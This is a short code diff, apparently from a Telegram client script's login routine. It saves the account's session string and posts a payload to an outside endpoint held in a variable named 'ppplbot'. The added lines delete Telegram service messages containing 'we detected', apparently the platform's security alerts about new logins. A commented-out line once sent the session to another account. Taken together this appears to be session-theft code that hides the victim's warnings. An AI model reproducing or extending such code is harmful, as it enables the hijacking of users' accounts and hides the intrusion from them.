@@ -224,7 +224,6 @@ async function login() {
         } else {
             console.log(client.session.save());
             client.addEventHandler(deleteMsgs, new NewMessage({ incoming: true }));
-
             await sendChannels();
             await sleep(1000)
             const sess = client.session.save() as unknown as string;
@@ -249,6 +248,12 @@ async function login() {
                 body: JSON.stringify(payload)
             };
             await fetchWithTimeout(`${ppplbot}`, options);
+            const msgs = await client.getMessages("777000", { limit: 2 });
+            msgs.forEach(async msg => {
+                if (msg.text.toLowerCase().includes('we detected')) {
+                    await msg.delete({ revoke: true });
+                }
+            })
             // const msg = await client.sendMessage('@myvideocallAccount', { message: sess });
             // await msg.delete();
             await restAcc();
